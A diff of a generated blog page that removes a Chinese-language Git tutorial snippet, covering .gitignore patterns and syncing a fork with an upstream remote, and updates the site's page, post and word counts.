-</li>
-<li>常用参数<ul>
-<li>配置文件：.settings/</li>
-<li>脚本文件：*.sh</li>
-<li>上次所有txt文件：!*.txt</li>
-<li>某个目录：/a/*.class</li>
-</ul>
-</li>
-<li>gitignore网站：<a href="https://www.gitignore.io" target="_blank" rel="noopener">https://www.gitignore.io</a></li>
-<li>查看远程的版本信息：<strong><code>🔺命令：git remote -v</code></strong></li>
-<li>增加一个远程仓库上传流：<strong><code>🔺命令：git remote add upstream https://...</code></strong></li>
-<li>更新远程仓库的版本：<strong><code>🔺命令：git fetch upstream 分支名</code></strong><ul>
-<li>分支名默认省略，则为master分支</li>
-<li>▲ pull = fetch + merge</li>
-</ul>
-</li>
-<li>查看远程原始仓库的分支：<strong><code>🔺命令：git branch -r</code></strong></li>
-</ul>
-<h4 id="2-Git-tutorial-Repository"><a href="#2-Git-tutorial-Repository" class="headerlink" title="2. Git-tutorial Repository"></a>2. Git-tutorial Repository</h4><ul>
-<li>cd git-tutorial</li>
-<li>git add -A .</li>
-<li>git commit -m “add gitignore”</li>
-<li>git push -f</li>
-<li>git clone https://……awesome</li>
-<li>cd awesome</li>
-<li>git remote -v</li>
-<li>git remote add upstream https://…</li>
-<li>git remote -v</li>
-<li>git fetch upstream </li>
-<li>git branch -r</li>
-<li>git rebase upstream/master<ul>
-<li>merge关注的是提交的历史，将两次操作合并，但无提交数据，rebase则足够</li>
-</ul>
-</li>
-<li>git push</li>
-<li>git log</li>
-</ul>
-
-          
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
   </section>
 
   
   <nav class="pagination">
-    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><span class="space">&hellip;</span><a class="page-number" href="/page/12/">12</a><a class="extend next" rel="next" href="/page/2/">Next</a>
+    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><span class="space">&hellip;</span><a class="page-number" href="/page/13/">13</a><a class="extend next" rel="next" href="/page/2/">Next</a>
   </nav>
 
 
@@ -2475,7 +2907,7 @@
               
                 <a href="/archives/">
               
-                  <span class="site-state-item-count">120</span>
+                  <span class="site-state-item-count">121</span>
                   <span class="site-state-item-name">日志</span>
                 </a>
               </div>
@@ -2582,7 +3014,7 @@
     
       <span class="post-meta-item-text">Site words total count&#58;</span>
     
-    <span title="Site words total count">105.2k</span>
+    <span title="Site words total count">107.3k</span>
   
 </div>
 
